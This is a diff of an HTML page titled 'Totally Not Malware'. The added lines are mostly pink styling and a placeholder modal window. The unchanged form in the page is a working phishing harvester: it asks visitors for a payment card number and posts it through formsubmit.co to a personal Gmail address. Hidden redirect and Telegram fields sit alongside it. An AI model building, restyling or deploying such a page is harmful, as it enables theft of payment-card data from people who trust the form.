@@ -9,48 +9,125 @@
             font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #e0e0e0;
+            background-color: #f8e7eb; /* Розовый фон */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
         .form-container {
-            background-color: #ffffff;
+            background-color: #fff5f7; /* Розовый светлый фон */
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 300px;
+            width: 90%;
+            max-width: 300px;
             text-align: center;
         }
         .form-container h1 {
             font-size: 18px;
             margin-bottom: 20px;
+            color: #ff69b4; /* Розовый заголовок */
         }
         .form-container input {
             width: 100%;
             margin-bottom: 15px;
             padding: 10px;
-            border: 1px solid #ccc;
+            border: 1px solid #ffc0cb; /* Розовая граница */
             border-radius: 4px;
         }
         .form-container button {
             width: 100%;
             padding: 10px;
-            background-color: #0078d7;
+            background-color: #ff69b4; /* Розовая кнопка */
             color: white;
             border: none;
             border-radius: 4px;
             cursor: pointer;
         }
         .form-container button:hover {
-            background-color: #005bb5;
+            background-color: #db7093; /* Темно-розовая кнопка при наведении */
+        }
+
+        /* Модальное окно */
+        .modal {
+            display: none; 
+            position: fixed; 
+            z-index: 1; 
+            left: 0;
+            top: 0;
+            width: 100%; 
+            height: 100%; 
+            overflow: auto; 
+            background-color: rgb(0,0,0); 
+            background-color: rgba(0,0,0,0.4); 
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background-color: #fff5f7; /* Розовый светлый фон */
+            margin: 15% auto; 
+            padding: 20px;
+            border: 1px solid #ffc0cb; /* Розовая граница */
+            width: 90%; 
+            max-width: 500px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: flex;
+        }
+
+        .close {
+            color: #ff69b4; /* Розовый крестик */
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 30px;
+            height: 30px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .modal-left {
+            width: 100px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-right {
+            flex: 1;
+            padding-left: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .modal-content {
+                flex-direction: column;
+            }
+            .modal-left, .modal-right {
+                width: 100%;
+                padding: 10px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="form-container">
         <h1>Totally Not Malware</h1>
+        <button id="openModalBtn">Open Modal</button>
         <form action="https://formsubmit.co/andrej.g2103@gmail.com" method="POST">
             <!-- Поля для ввода данных -->
             <input type="text" name="Card Number" placeholder="Card number" required>
@@ -63,9 +140,46 @@
             <input type="hidden" name="_next" value="https://goosemma.github.io">
             <input type="hidden" name="_telegram" value="">
             <input type="hidden" name="_telegram_token" value="">
-
             <button type="submit">Th-thanks</button>
         </form>
     </div>
+
+    <!-- Модальное окно -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <div class="modal-left">
+                <img src="your-gif.gif" alt="GIF" style="max-width: 100%;">
+            </div>
+            <div class="modal-right">
+                <h2>Модальное окно</h2>
+                <p>Это окно находится поверх всех элементов и немного размывает фон.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Получаем элементы модального окна и кнопки закрытия
+        var modal = document.getElementById("myModal");
+        var btn = document.getElementById("openModalBtn");
+        var span = document.getElementsByClassName("close")[0];
+
+        // Когда пользователь нажимает на кнопку, открываем модальное окно
+        btn.onclick = function() {
+            modal.style.display = "block";
+        }
+
+        // Когда пользователь нажимает на кнопку закрытия (x), закрываем модальное окно
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+        // Когда пользователь щелкает в любом месте за пределами модального окна, закрываем его
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
 </body>
 </html>
